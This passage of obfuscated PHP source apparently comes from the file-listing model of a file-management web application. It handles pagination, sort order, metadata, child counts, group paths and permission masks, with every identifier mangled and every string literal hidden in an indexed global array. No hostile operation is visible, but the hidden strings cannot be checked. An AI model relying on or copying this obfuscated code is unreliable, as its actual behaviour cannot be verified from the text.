$°üç‘Ñº[228]) { $ºœÊ¨¦î[$°üç‘Ñº[486]] = array($°üç‘Ñº[407], $°üç‘Ñº[506]); } $¥™ˆ†• = $°üç‘Ñº[507]; $ı‘†©—½ = $this->field($¥™ˆ†•)->_makeOrder()->where($ºœÊ¨¦î)->selectPage($ÎîÙò¡); $this->_listPageCheck($ı‘†©—½, $¥™ˆ†•, $ºœÊ¨¦î); $this->_listDataApply($ı‘†©—½[$°üç‘Ñº[445]], $Ä÷œ¢ˆü); $this->_listMake($ı‘†©—½); return $ı‘†©—½; } private function _listPageCheck(&$ÊıªŸÇƒ, $²‹ÅÚ¡„, $ÚûûåÜğ) { $±îÍÏÔú =& $_SERVER[‹è™Ü¸Ñ]; if (!is_array($ÊıªŸÇƒ[$±îÍÏÔú[442]])) { return; } $™ÃúÅ¯ = $ÊıªŸÇƒ[$±îÍÏÔú[442]]; if ($™ÃúÅ¯[$±îÍÏÔú[444]] <= 1) { return; } if ($™ÃúÅ¯[$±îÍÏÔú[443]] >= 100000) { return; } if (Model($±îÍÏÔú[508])->get($±îÍÏÔú[509]) != $±îÍÏÔú[510]) { return; } $²‹ÅÚ¡„ = str_replace(array($±îÍÏÔú[53], $±îÍÏÔú[418], $±îÍÏÔú[262]), $±îÍÏÔú[12], $²‹ÅÚ¡„); $²‹ÅÚ¡„ = $±îÍÏÔú[511] . str_replace($±îÍÏÔú[50], $±îÍÏÔú[512], $²‹ÅÚ¡„) . $±îÍÏÔú[513]; $ª†¿ˆš± = $±îÍÏÔú[514]; $ª†¿ˆš± = $ª†¿ˆš± . $±îÍÏÔú[515]; $÷ôÄĞÆˆ = $™ÃúÅ¯[$±îÍÏÔú[439]] * ($™ÃúÅ¯[$±îÍÏÔú[429]] - 1) . $±îÍÏÔú[50] . $™ÃúÅ¯[$±îÍÏÔú[439]]; $ÚªŞ—óÏ = $this->_makeOrder(!0); $‘Ö ¾¿Ô = $±îÍÏÔú[511] . str_replace($±îÍÏÔú[50], $±îÍÏÔú[512], $ÚªŞ—óÏ[0]); if (strpos($‘Ö ¾¿Ô, $±îÍÏÔú[516])) { $‘Ö ¾¿Ô = str_replace($±îÍÏÔú[516], $±îÍÏÔú[517], $‘Ö ¾¿Ô); } else { $‘Ö ¾¿Ô .= $±îÍÏÔú[518] . $ÚªŞ—óÏ[1]; } $ı¦â¯ÉÓ = array(); foreach ($ÚûûåÜğ as $äì´ÑÓ => $ªŸˆïĞû) { $ı¦â¯ÉÓ[$±îÍÏÔú[511] . $äì´ÑÓ] = $ªŸˆïĞû; } $this->alias($±îÍÏÔú[519])->field($²‹ÅÚ¡„)->limit($÷ôÄĞÆˆ)->order($‘Ö ¾¿Ô); $¼Ì¿£å = $this->join($ª†¿ˆš±)->where($ı¦â¯ÉÓ)->select(); if ($¼Ì¿£å) { $ÊıªŸÇƒ[$±îÍÏÔú[445]] = $¼Ì¿£å; } } protected function _makeOrder($ÎöÑ£¹¹ = false) { $õªğò‚¢ =& $_SERVER[‹è™Ü¸Ñ]; $¾‹¢Ÿ¸ = Model($õªğò‚¢[520])->get($õªğò‚¢[521]); $ü€êÒ‹Ô = Model($õªğò‚¢[520])->get($õªğò‚¢[522]); $¸Ğƒãù£ = array($õªğò‚¢[523] => $õªğò‚¢[524], $õªğò‚¢[525] => $õªğò‚¢[526]); $Çà¦–´ˆ = array($õªğò‚¢[32] => $õªğò‚¢[32], $õªğò‚¢[79] => $õªğò‚¢[79], $õªğò‚¢[169] => $õªğò‚¢[486], $õªğò‚¢[527] => $õªğò‚¢[527], $õªğò‚¢[528] => $õªğò‚¢[529], $õªğò‚¢[231] => $õªğò‚¢[231], $õªğò‚¢[88] => $õªğò‚¢[88]); $¬¬åİ¶ı = Input::get($õªğò‚¢[530], $õªğò‚¢[7], $¾‹¢Ÿ¸, array_keys($Çà¦–´ˆ)); $Úíà¸àÄ = Input::get($õªğò‚¢[531], $õªğò‚¢[7], $ü€êÒ‹Ô, array_keys($¸Ğƒãù£)); if (!in_array($¬¬åİ¶ı, array_keys($Çà¦–´ˆ))) { $¬¬åİ¶ı = $õªğò‚¢[32]; } if (!in_array($Úíà¸àÄ, array_keys($¸Ğƒãù£))) { $¬¬åİ¶ı = $õªğò‚¢[523]; } if ($¬¬åİ¶ı == $õªğò‚¢[32]) { } $Õ–•í¬Ü = $õªğò‚¢[532] . $Çà¦–´ˆ[$¬¬åİ¶ı] . $õªğò‚¢[53] . $¸Ğƒãù£[$Úíà¸àÄ]; $Õ–•í¬Ü = rtrim(trim($Õ–•í¬Ü), $õªğò‚¢[50]); if ($ÎöÑ£¹¹) { return array($Õ–•í¬Ü, $¸Ğƒãù£[$Úíà¸àÄ]); } return $this->order($Õ–•í¬Ü); } protected function _listDataApplyItem($òÊ´ÎÒ¹, $†êìáÑ = false) { $Ú¹ŠÎğ³ = array($òÊ´ÎÒ¹); $this->_listDataApply($Ú¹ŠÎğ³, $†êìáÑ); return $Ú¹ŠÎğ³[0]; } protected function _listDataApply(&$ø™Ûô²Œ, $…£ÖÏ›Ö = false) { $Âı°¤Š =& $_SERVER[‹è™Ü¸Ñ]; if (!$ø™Ûô²Œ) { $ø™Ûô²Œ = array(); return; } $¤¼Ù—‡ = array_to_keyvalue($ø™Ûô²Œ, $Âı°¤Š[12], $Âı°¤Š[193]); $¤¼Ù—‡ = array_unique($¤¼Ù—‡); $this->_listSourceCache($ø™Ûô²Œ); if (!$…£ÖÏ›Ö) { $this->_listAppendMeta($ø™Ûô²Œ, $¤¼Ù—‡); $this->_listAppendFileMeta($ø™Ûô²Œ, $¤¼Ù—‡); $this->_listAppendChildren($ø™Ûô²Œ, $¤¼Ù—‡); } $this->_listAppendPath($ø™Ûô²Œ); $this->_listAppendAuth($ø™Ûô²Œ); $this->_listAppendSourceInfo($ø™Ûô²Œ, $¤¼Ù—‡); $this->_listAppendUser($ø™Ûô²Œ); $this->_listFilterInfo($ø™Ûô²Œ, $…£ÖÏ›Ö); $this->_listAppendAuthSecret($ø™Ûô²Œ); } protected function _listSourceCache($×Ş¼Æõ) { $ìÕÅ°ãá =& $_SERVER[‹è™Ü¸Ñ]; foreach ($×Ş¼Æõ as $ËÁÆŒĞÃ) { self::$cacheSourceInfo[$ìÕÅ°ãá[533] . $ËÁÆŒĞÃ[$ìÕÅ°ãá[193]]] = $ËÁÆŒĞÃ; } } protected function _listFilterInfo(&$ÄöèñË´, $ì ò”É¤ = false) { $ÓÙÇ›²× =& $_SERVER[‹è™Ü¸Ñ]; foreach ($ÄöèñË´ as &$ÖÀÌ¤÷¶) { $ÖÀÌ¤÷¶ = $this->pathInfoFilter($ÖÀÌ¤÷¶); self::$cachePathInfo[$ÓÙÇ›²×[534] . intval($ì ò”É¤) . $ÓÙÇ›²×[462] . $ÖÀÌ¤÷¶[$ÓÙÇ›²×[193]]] = $ÖÀÌ¤÷¶; } unset($ÖÀÌ¤÷¶); } protected function _listMake(&$èß‹²™×) { $Í¼ó•ÊÜ =& $_SERVER[‹è™Ü¸Ñ]; $èß‹²™×[$Í¼ó•ÊÜ[85]] = array(); $èß‹²™×[$Í¼ó•ÊÜ[86]] = array(); foreach ($èß‹²™×[$Í¼ó•ÊÜ[445]] as $•èŠêò) { $ÉÜ¹À“Ö = $•èŠêò[$Í¼ó•ÊÜ[485]] == 1 ? $Í¼ó•ÊÜ[85] : $Í¼ó•ÊÜ[86]; $èß‹²™×[$ÉÜ¹À“Ö][] = $•èŠêò; } unset($èß‹²™×[$Í¼ó•ÊÜ[445]]); } protected function _listAppendMeta(&$¨…Òåş“, $şå˜ÊÑÖ) { $ÕéïÏéí =& $_SERVER[‹è™Ü¸Ñ]; $ŠÒ ¨Ç¿ = array($ÕéïÏéí[491] => array($ÕéïÏéí[492], $şå˜ÊÑÖ)); $›ÕĞ’—¨ = Model($ÕéïÏéí[535])->field($ÕéïÏéí[536])->where($ŠÒ ¨Ç¿)->select(); if (!$›ÕĞ’—¨) { return; } $«úû¦íš = array($ÕéïÏéí[537], $ÕéïÏéí[538], $ÕéïÏéí[517]); $ğ¾ËôŠ› = array(); foreach ($›ÕĞ’—¨ as $şÇÜ—ËÑ) { if (!isset($ğ¾ËôŠ›[$şÇÜ—ËÑ[$ÕéïÏéí[193]]])) { $ğ¾ËôŠ›[$şÇÜ—ËÑ[$ÕéïÏéí[193]]] = array(); } if (in_array($şÇÜ—ËÑ[$ÕéïÏéí[97]], $«úû¦íš)) { continue; } $ğ¾ËôŠ›[$şÇÜ—ËÑ[$ÕéïÏéí[193]]][$şÇÜ—ËÑ[$ÕéïÏéí[97]]] = $şÇÜ—ËÑ[$ÕéïÏéí[450]]; } foreach ($¨…Òåş“ as &$ëÅ®û¦Õ) { $ëÅ®û¦Õ[$ÕéïÏéí[539]] = !1; if (isset($ğ¾ËôŠ›[$ëÅ®û¦Õ[$ÕéïÏéí[193]]])) { $ëÅ®û¦Õ[$ÕéïÏéí[539]] = $ğ¾ËôŠ›[$ëÅ®û¦Õ[$ÕéïÏéí[193]]]; } if ($this->fileIsLock($ëÅ®û¦Õ) && $ëÅ®û¦Õ[$ÕéïÏéí[487]]) { $™„µ°ß = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ëÅ®û¦Õ[$ÕéïÏéí[487]][$ÕéïÏéí[488]] = AuthModel::authDisable($ëÅ®û¦Õ[$ÕéïÏéí[487]][$ÕéïÏéí[488]], $™„µ°ß); $ëÅ®û¦Õ[$ÕéïÏéí[487]][$ÕéïÏéí[540]][$ÕéïÏéí[487]] = $ëÅ®û¦Õ[$ÕéïÏéí[487]][$ÕéïÏéí[488]]; } } unset($ëÅ®û¦Õ); } protected function _listAppendFileMeta(&$íÎ®Á, $ñÑ”ùòô) { $ñî«İ =& $_SERVER[‹è™Ü¸Ñ]; $Ñäöé’ = array_to_keyvalue($íÎ®Á, $ñî«İ[12], $ñî«İ[541]); $Ñäöé’ = array_filter(array_unique($Ñäöé’)); if (!$Ñäöé’) { return; } $ş‡¯îÈ = array($ñî«İ[542] => array($ñî«İ[492], $Ñäöé’)); $˜´¯œ¢ = $ñî«İ[543]; $ºú‰Šñ = Model($ñî«İ[544])->field($˜´¯œ¢)->where($ş‡¯îÈ)->select(); $ºú‰Šñ = array_to_keyvalue($ºú‰Šñ, $ñî«İ[541]); $¦ê¦êïĞ = Model($ñî«İ[545])->field($ñî«İ[546])->where($ş‡¯îÈ)->select(); $¦ê¦êïĞ = $¦ê¦êïĞ ? $¦ê¦êïĞ : array(); $å¬òË”¶ = array(); foreach ($¦ê¦êïĞ as $¹×¶¾ÇÓ) { if (!isset($å¬òË”¶[$¹×¶¾ÇÓ[$ñî«İ[541]]])) { $å¬òË”¶[$¹×¶¾ÇÓ[$ñî«İ[541]]] = array(); } $å¬òË”¶[$¹×¶¾ÇÓ[$ñî«İ[541]]][$¹×¶¾ÇÓ[$ñî«İ[97]]] = $¹×¶¾ÇÓ[$ñî«İ[450]]; } foreach ($íÎ®Á as &$ÚÆ¼ÅËÈ) { $×Í¸õÍÃ = $ÚÆ¼ÅËÈ[$ñî«İ[541]]; if (!$×Í¸õÍÃ || !is_array($ºú‰Šñ[$×Í¸õÍÃ])) { continue; } $ğ½Ë§ñï = $ºú‰Šñ[$×Í¸õÍÃ]; $ğ½Ë§ñï[$ñî«İ[79]] = $ÚÆ¼ÅËÈ[$ñî«İ[79]]; $ğ½Ë§ñï[$ñî«İ[32]] = $ÚÆ¼ÅËÈ[$ñî«İ[32]]; if (!$ğ½Ë§ñï[$ñî«İ[547]]) { Model($ñî«İ[544])->fileMd5Check($ğ½Ë§ñï); } if (!isset(self::$cacheFileInfo[$ñî«İ[548] . $×Í¸õÍÃ])) { self::$cacheFileInfo[$ñî«İ[548] . $×Í¸õÍÃ] = array_merge(array(), $ğ½Ë§ñï); } unset($ºú‰Šñ[$×Í¸õÍÃ][$ñî«İ[87]]); $ä»èó ‹ = isset($å¬òË”¶[$×Í¸õÍÃ]) && is_array($å¬òË”¶[$×Í¸õÍÃ]) ? $å¬òË”¶[$×Í¸õÍÃ] : array(); $ÚÆ¼ÅËÈ[$ñî«İ[170]] = array_merge($ä»èó ‹, $ºú‰Šñ[$×Í¸õÍÃ]); if (isset($ÚÆ¼ÅËÈ[$ñî«İ[170]][$ñî«İ[184]])) { $ÚÆ¼ÅËÈ[$ñî«İ[184]] = json_decode($ÚÆ¼ÅËÈ[$ñî«İ[170]][$ñî«İ[184]], !0); unset($ÚÆ¼ÅËÈ[$ñî«İ[170]][$ñî«İ[184]]); } } unset($ÚÆ¼ÅËÈ); } protected function _listAppendSourceInfo(&$úÛúÆŒß, $ß³‰¾Ğ¥) { $†òÕ—Àö =& $_SERVER[‹è™Ü¸Ñ]; $šå–åÉ = Model($†òÕ—Àö[549])->listData(); $úÜ»ÄŞ† = Model($†òÕ—Àö[499])->listData(); $„ÄœÏ×Ë = Model($†òÕ—Àö[489])->listData(); $ï¥ÛíüÍ = Model($†òÕ—Àö[550])->listSimple(); $²ñ»ÔÕ = array_to_keyvalue($šå–åÉ, $†òÕ—Àö[475]); $ª”ˆœñ² = array_to_keyvalue_group($úÜ»ÄŞ†, $†òÕ—Àö[87], $†òÕ—Àö[500]); $¯êì«¿è = array_to_keyvalue($„ÄœÏ×Ë, $†òÕ—Àö[87]); $×­£³¨¼ = array_to_keyvalue_group($ï¥ÛíüÍ, $†òÕ—Àö[193]); foreach ($úÛúÆŒß as &$ÇÑò‚ö¾) { $ÇÑò‚ö¾[$†òÕ—Àö[90]] = array($†òÕ—Àö[551] => 0, $†òÕ—Àö[552] => 0, $†òÕ—Àö[553] => 0); if (isset($¯êì«¿è[$ÇÑò‚ö¾[$†òÕ—Àö[193]]])) { $ÇÑò‚ö¾[$†òÕ—Àö[90]][$†òÕ—Àö[554]] = 1; $ÇÑò‚ö¾[$†òÕ—Àö[90]][$†òÕ—Àö[555]] = $¯êì«¿è[$ÇÑò‚ö¾[$†òÕ—Àö[193]]][$†òÕ—Àö[32]]; } if ($ª”ˆœñ² && $²ñ»ÔÕ && isset($ª”ˆœñ²[$ÇÑò‚ö¾[$†òÕ—Àö[193]]])) { $ÇÑò‚ö¾[$†òÕ—Àö[90]][$†òÕ—Àö[556]] = array(); foreach ($ª”ˆœñ²[$ÇÑò‚ö¾[$†òÕ—Àö[193]]] as $ô°˜°“) { $¶œ“ü‰ç = $²ñ»ÔÕ[$ô°˜°“]; $ÇÑò‚ö¾[$†òÕ—Àö[90]][$†òÕ—Àö[556]][] = array($†òÕ—Àö[557] => $¶œ“ü‰ç[$†òÕ—Àö[475]], $†òÕ—Àö[494] => $¶œ“ü‰ç[$†òÕ—Àö[32]], $†òÕ—Àö[558] => $¶œ“ü‰ç[$†òÕ—Àö[559]]); } } if ($×­£³¨¼ && isset($×­£³¨¼[$ÇÑò‚ö¾[$†òÕ—Àö[193]]])) { $ÇÑò‚ö¾[$†òÕ—Àö[90]][$†òÕ—Àö[560]] = array(); foreach ($×­£³¨¼[$ÇÑò‚ö¾[$†òÕ—Àö[193]]] as $íáƒû©) { $è®Ê¬òâ = $†òÕ—Àö[561]; if ($íáƒû©[$†òÕ—Àö[562]] == $†òÕ—Àö[91]) { $è®Ê¬òâ .= $†òÕ—Àö[563]; } $ÇÑò‚ö¾[$†òÕ—Àö[90]][$†òÕ—Àö[560]] = array_field_key($íáƒû©, explode($†òÕ—Àö[50], $è®Ê¬òâ)); } } } unset($ÇÑò‚ö¾); return $úÛúÆŒß; } protected function _listAppendChildren(&$Ó˜ƒÈ™–, $ÎÊÂÈæ) { $ŠõØÖè =& $_SERVER[‹è™Ü¸Ñ]; $ƒô­Òß = array(); $Á—”œæ = array($ŠõØÖè[239] => 0, $ŠõØÖè[240] => 0); foreach ($Ó˜ƒÈ™– as &$ØîÒ„˜Ò) { if (!$ØîÒ„˜Ò[$ŠõØÖè[485]]) { continue; } $ƒô­Òß[] = $ØîÒ„˜Ò[$ŠõØÖè[193]]; } unset($ØîÒ„˜Ò); if (!$ƒô­Òß) { return; } $‰×“ÅÉ• = array($ŠõØÖè[192] => array($ŠõØÖè[7], $ƒô­Òß), $ŠõØÖè[505] => 0); $’Æ›ÁƒÓ = array($ŠõØÖè[192], $ŠõØÖè[485], $ŠõØÖè[564] => $ŠõØÖè[565]); $²Šî“Ë = $this->field($’Æ›ÁƒÓ)->where($‰×“ÅÉ•)->group($ŠõØÖè[566])->select(); $‰­¹‘Ç© = array(); foreach ($²Šî“Ë as $³ëØ¿€Ç) { $âµŸºÙà = $³ëØ¿€Ç[$ŠõØÖè[192]]; $õƒ¢Ğ±Ú = $³ëØ¿€Ç[$ŠõØÖè[485]] == $ŠõØÖè[91] ? $ŠõØÖè[240] : $ŠõØÖè[239]; if (!isset($‰­¹‘Ç©[$âµŸºÙà])) { $‰­¹‘Ç©[$âµŸºÙà] = array($ŠõØÖè[239] => 0, $ŠõØÖè[240] => 0); } $‰­¹‘Ç©[$âµŸºÙà][$õƒ¢Ğ±Ú] += $³ëØ¿€Ç[$ŠõØÖè[565]]; } foreach ($Ó˜ƒÈ™– as &$ØîÒ„˜Ò) { if (!$ØîÒ„˜Ò[$ŠõØÖè[485]]) { continue; } $à´Ç¯éÕ = is_array($‰­¹‘Ç©[$ØîÒ„˜Ò[$ŠõØÖè[193]]]) ? $‰­¹‘Ç©[$ØîÒ„˜Ò[$ŠõØÖè[193]]] : $Á—”œæ; $ØîÒ„˜Ò[$ŠõØÖè[240]] = $à´Ç¯éÕ[$ŠõØÖè[240]]; $ØîÒ„˜Ò[$ŠõØÖè[239]] = $à´Ç¯éÕ[$ŠõØÖè[239]]; unset($ØîÒ„˜Ò[$ŠõØÖè[486]]); } unset($ØîÒ„˜Ò); } protected function _listAppendAuth(&$Øˆ•†Ş) { $¹†ãÎ‘È =& $_SERVER[‹è™Ü¸Ñ]; $ª¯şÆ£î = array(); foreach ($Øˆ•†Ş as $ãé÷îˆå) { if ($ãé÷îˆå[$¹†ãÎ‘È[190]] == self::TYPE_GROUP) { $ª¯şÆ£î[] = $ãé÷îˆå[$¹†ãÎ‘È[193]]; } } if (!$ª¯şÆ£î) { return; } $¢×ëûá« = array_to_keyvalue($Øˆ•†Ş, $¹†ãÎ‘È[193]); $òÙÕÈ†– = Model($¹†ãÎ‘È[567])->getSourceList($ª¯şÆ£î, $¢×ëûá«); $–Ò èŒ² = KodUser::isRoot(); foreach ($Øˆ•†Ş as $‰„½µ©¯ => &$ãé÷îˆå) { $ãé÷îˆå[$¹†ãÎ‘È[487]] = $òÙÕÈ†–[$ãé÷îˆå[$¹†ãÎ‘È[193]]]; if (!$ãé÷îˆå[$¹†ãÎ‘È[487]] && $ãé÷îˆå[$¹†ãÎ‘È[190]] == self::TYPE_GROUP) { $ãé÷îˆå[$¹†ãÎ‘È[487]] = Action($¹†ãÎ‘È[568])->pathGroupAuthMake($ãé÷îˆå[$¹†ãÎ‘È[569]]); if (!$ãé÷îˆå[$¹†ãÎ‘È[487]] && !$–Ò èŒ²) { $ãé÷îˆå[$¹†ãÎ‘È[233]] = !1; $ãé÷îˆå[$¹†ãÎ‘È[232]] = !1; } } if ($ãé÷îˆå[$¹†ãÎ‘È[487]]) { $ãé÷îˆå[$¹†ãÎ‘È[233]] = AuthModel::authCheckEdit($ãé÷îˆå[$¹†ãÎ‘È[487]][$¹†ãÎ‘È[488]]); $ãé÷îˆå[$¹†ãÎ‘È[232]] = AuthModel::authCheckView($ãé÷îˆå[$¹†ãÎ‘È[487]][$¹†ãÎ‘È[488]]); } $this->groupPathDisplay($ãé÷îˆå); } unset($ãé÷îˆå); } public function _listAppendAuthSecret(&$ÍÁ ø°Í) { $™Ê°÷¼ =& $_SERVER[‹è™Ü¸Ñ]; if (Model($™Ê°÷¼[508])->get($™Ê°÷¼[570]) != $™Ê°÷¼[91]) { return; } static $ã©Ë¨Ó­ = false; if (!$ã©Ë¨Ó­) { $ÎõäãÌ = Model($™Ê°÷¼[571]); $½€±ˆ« = Model($™Ê°÷¼[572]); $ã©Ë¨Ó­ = $½€±ˆ«->listData(); $ã©Ë¨Ó­ = array_to_keyvalue($ã©Ë¨Ó­, $™Ê°÷¼[193]); $•÷‡‹• = json_decode(Model($™Ê°÷¼[508])->get($™Ê°÷¼[573]), !0); $•÷‡‹• = array_to_keyvalue($•÷‡‹•, $™Ê°÷¼[475]); foreach ($ã©Ë¨Ó­ as $¡ÈËŒË => $ƒÑƒƒóÔ) { $¬Î„¦«Ø = $•÷‡‹•[$ƒÑƒƒóÔ[$™Ê°÷¼[574]]]; if (!$¬Î„¦«Ø) { $½€±ˆ«->remove($ƒÑƒƒóÔ[$™Ê°÷¼[475]]); unset($ã©Ë¨Ó­[$¡ÈËŒË]); continue; } $×µ—ô¥¯ = $ÎõäãÌ->listData($¬Î„¦«Ø[$™Ê°÷¼[487]]); if (!$×µ—ô¥¯) { $½€±ˆ«->remove($ƒÑƒƒóÔ[$™Ê°÷¼[475]]); unset($ã©Ë¨Ó­[$¡ÈËŒË]); continue; } $ƒÑƒƒóÔ[$™Ê°÷¼[487]] = $×µ—ô¥¯; $ƒÑƒƒóÔ[$™Ê°÷¼[575]] = $¬Î„¦«Ø; $ƒÑƒƒóÔ[$™Ê°÷¼[576]] = Model($™Ê°÷¼[577])->getInfoSimpleOuter($ƒÑƒƒóÔ[$™Ê°÷¼[527]]); $ã©Ë¨Ó­[$¡ÈËŒË] = $ƒÑƒƒóÔ; } } $ª ‡Ñşõ = USER_ID; $êÎ´²Å´ = array(); $•¥õ­êõ = $this->_listAppendPath($êÎ´²Å´, !0); foreach ($ÍÁ ø°Í as $¡ÈËŒË => &$ƒÑƒƒóÔ) { if (!is_array($ƒÑƒƒóÔ[$™Ê°÷¼[487]])) { continue; } if ($ƒÑƒƒóÔ[$™Ê°÷¼[190]] != $™Ê°÷¼[578]) { continue; } if (isset($ã©Ë¨Ó­[$ƒÑƒƒóÔ[$™Ê°÷¼[193]]])) { $Ä¸ûË™í = $ã©Ë¨Ó­[$ƒÑƒƒóÔ[$™Ê°÷¼[193]]]; if (!is_array($ƒÑƒƒóÔ[$™Ê°÷¼[539]])) { $ƒÑƒƒóÔ[$™Ê°÷¼[539]] = array(); } $ƒÑƒƒóÔ[$™Ê°÷¼[539]][$™Ê°÷¼[579]] = $Ä¸ûË™í[$™Ê°÷¼[574]]; $ƒÑƒƒóÔ[$™Ê°÷¼[487]][$™Ê°÷¼[580]] = $Ä¸ûË™í; $ƒÑƒƒóÔ[$™Ê°÷¼[487]][$™Ê°÷¼[581]] = $ƒÑƒƒóÔ[$™Ê°÷¼[582]]; $ƒÑƒƒóÔ[$™Ê°÷¼[487]][$™Ê°÷¼[583]] = $™Ê°÷¼[91]; if ($Ä¸ûË™í[$™Ê°÷¼[527]] != $ª ‡Ñşõ) { $ƒÑƒƒóÔ[$™Ê°÷¼[487]][$™Ê°÷¼[488]] = $ƒÑƒƒóÔ[$™Ê°÷¼[487]][$™Ê°÷¼[488]] & $Ä¸ûË™í[$™Ê°÷¼[487]][$™Ê°÷¼[487]]; } continue; } $êØ¬Ãá = $this->parentLevelArray($ƒÑƒƒóÔ[$™Ê°÷¼[584]]); $‡ÙÆé• = array_reverse($êØ¬Ãá); foreach ($‡ÙÆé• as $Âêß£¡‰ => $­µÜÏó¡) { if (!isset($ã©Ë¨Ó­[$­µÜÏó¡])) { continue; } $Ä¸ûË™í = $ã©Ë¨Ó­[$­µÜÏó¡]; $ƒÑƒƒóÔ[$™Ê°÷¼[487]][$™Ê°÷¼[580]] = $Ä¸ûË™í; if ($Ä¸ûË™í[$™Ê°÷¼[527]] != $ª ‡Ñşõ) { $ƒÑƒƒóÔ[$™Ê°÷¼[487]][$™Ê°÷¼[488]] = $ƒÑƒƒóÔ[$™Ê°÷¼[487]][$™Ê°÷¼[488]] & $Ä¸ûË™í[$™Ê°÷¼[487]][$™Ê°÷¼[487]]; } $êÉ¨Èó‘ = $™Ê°÷¼[12]; $³ô™ñÓ„ = count($êØ¬Ãá) - $Âêß£¡‰; for ($öÈª™ÀÔ = 0; $öÈª™ÀÔ < $³ô™ñÓ„; $öÈª™ÀÔ++) { if (!isset($•¥õ­êõ[$êØ¬Ãá[$öÈª™ÀÔ]])) { $êÉ¨Èó‘ = $™Ê°÷¼[12]; break; } $êÉ¨Èó‘ = $êÉ¨Èó‘ . rtrim($•¥õ­êõ[$êØ¬Ãá[$öÈª™ÀÔ]], $™Ê°÷¼[8]) . $™Ê°÷¼[8]; } $ƒÑƒƒóÔ[$™Ê°÷¼[487]][$™Ê°÷¼[581]] = rtrim($êÉ¨Èó‘, $™Ê°÷¼[8]) . $™Ê°÷¼[8]; break; } } unset($ƒÑƒƒóÔ); } public function groupPathDisplay(&$‰õİ±„÷) { $Ô§¤ã† =& $_SERVER[‹è™Ü¸Ñ]; if ($‰õİ±„÷[$Ô§¤ã†[190]] != self::TYPE_GROUP) { return; } $‘Şæüğé = Model($Ô§¤ã†[585])->getInfo($‰õİ±„÷[$Ô§¤ã†[569]]); $õŸèôõ¹ = $this->parentLevelArray($‘Şæüğé[$Ô§¤ã†[584]]); $Ğæ°ãÈ = $Ô§¤ã†[12]; foreach ($õŸèôõ¹ as $Åí¡Íº¥) { $ˆ½’»ÎÖ = Model($Ô§¤ã†[585])->getInfo($Åí¡Íº¥); $Ğæ°ãÈ .= $ˆ½’»ÎÖ[$Ô§¤ã†[90]][$Ô§¤ã†[193]] . $Ô§¤ã†[50]; } $‰õİ±„÷[$Ô§¤ã†[586]] = $‘Şæüğé[$Ô§¤ã†[192]]; $‰õİ±„÷[$Ô§¤ã†[587]] = $‘Şæüğé[$Ô§¤ã†[584]]; $‰õİ±„÷[$Ô§¤ã†[588]] = $‘Şæüğé[$Ô§¤ã†[589]]; $‰õİ±„÷[$Ô§¤ã†[590]] = $Ğæ°ãÈ . $‘Şæüğé[$Ô§¤ã†[90]][$Ô§¤ã†[193]]; } protected function _listAppendPath(&$›ÜÖ²­µ, $¸¬Ô³ = false) { $¤£Ñæ›· =& $_SERVER[‹è™Ü¸Ñ]; static $Â¢ĞÊèŠ = array(); $¼Í–Ä‹ = array(); $õÀ¶æ£ = array(); if ($¸¬Ô³) { return $Â¢ĞÊèŠ; } foreach ($›ÜÖ²­µ as &$¦“Èç¨) { $Ò‚¯ÒŸæ = $¦“Èç¨[$¤£Ñæ›·[193]]; if ($¦“Èç¨[$¤£Ñæ›·[485]] == $¤£Ñæ›·[91] && $¦“Èç¨[$¤£Ñæ›·[192]] != 0) { $Â¢ĞÊèŠ[$Ò‚¯ÒŸæ] = $¦“Èç¨[$¤£Ñæ›·[32]]; } if ($¦“Èç¨[$¤£Ñæ›·[485]] == $¤£Ñæ›·[91] && $¦“Èç¨[$¤£Ñæ›·[192]] == 0) { $Â¢ĞÊèŠ[$Ò‚¯ÒŸæ] = $this->_listAppendPathRoot($¦“Èç¨, array()); } if (isset($õÀ¶æ£[$¦“Èç¨[$¤£Ñæ›·[584]]])) { continue; } $õÀ¶æ£[$¦“Èç¨[$¤£Ñæ›·[584]]] = !0; $¦®„“ê× = $this->parentLevelArray($¦“Èç¨[$¤£Ñæ›·[584]]); foreach ($¦®„“ê× as $ÛÖä‹ => $°ô­Ğšã) { if (isset($Â¢ĞÊèŠ[$°ô­Ğšã])) { continue; } if ($ÛÖä‹ == 0) { $Â¢ĞÊèŠ[$°ô­Ğšã] = $this->_listAppendPathRoot($¦“Èç¨, $¦®„“ê×); } if ($ÛÖä‹ != 0) { $¼Í–Ä‹[] = $°ô­Ğšã; } } } unset($¦“Èç¨); $¼Í–Ä‹ = array_unique($¼Í–Ä‹); if (count($¼Í–Ä‹) > 0) { $Â¯Å”‡Ò = array($¤£Ñæ›·[491] => array($¤£Ñæ›·[492], $¼Í–Ä‹)); if (count($¼Í–Ä‹) == 1) { $Ù½¬‹Ó— = $this->sourceInfo($¼Í–Ä‹[0]); $ŞÁ÷ÍãÄ = is_array($Ù½¬‹Ó—) ? array($Ù½¬‹Ó—) : !1; } else { $ŞÁ÷ÍãÄ = $this->field($¤£Ñæ›·[591])->where($Â¯Å”‡Ò)->select(); } if (!$ŞÁ÷ÍãÄ) { $ŞÁ÷ÍãÄ = array(); } foreach ($ŞÁ÷ÍãÄ as $Ãğíø„«) { $Â¢ĞÊèŠ[$Ãğíø„«[$¤£Ñæ›·[193]]] = $Ãğíø„«[$¤£Ñæ›·[32]]; } } $òåú•é— = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ü•ª«í¯ = array(); foreach ($›ÜÖ²­µ as &$¦“Èç¨) { $“†’®’È = $¦“Èç¨[$¤£Ñæ›·[584]]; $Ÿˆº½æ = $¤£Ñæ›·[12]; if (isset($ü•ª«í¯[$“†’®’È])) { $Ÿˆº½æ = $ü•ª«í¯[$“†’®’È]; } else { $¦®„“ê× = $this->parentLevelArray($¦“Èç¨[$¤£Ñæ›·[584]]); foreach ($¦®„“ê× as $ÛÖä‹ => $°ô­Ğšã) { if (isset($Â¢ĞÊèŠ[$°ô­Ğšã])) { $Ÿˆº½æ .= $Â¢ĞÊèŠ[$°ô­Ğšã] . $¤£Ñæ›·[8]; } } $ü•ª«í¯[$“†’®’È] = $Ÿˆº½æ; } $Ÿˆº½æ .= $¦“Èç¨[$¤£Ñæ›·[32]]; if ($¦“Èç¨[$¤£Ñæ›·[485]] == $¤£Ñæ›·[91]) { $Ÿˆº½æ .= $¤£Ñæ›·[8]; } $¦“Èç¨[$¤£Ñæ›·[582]] = str_replace($¤£Ñæ›·[592], $¤£Ñæ›·[8], $Ÿˆº½æ); if ($¦“Èç¨[$¤£Ñæ›·[192]] == $¤£Ñæ›·[228]) { $¦“Èç¨[$¤£Ñæ›·[32]] = 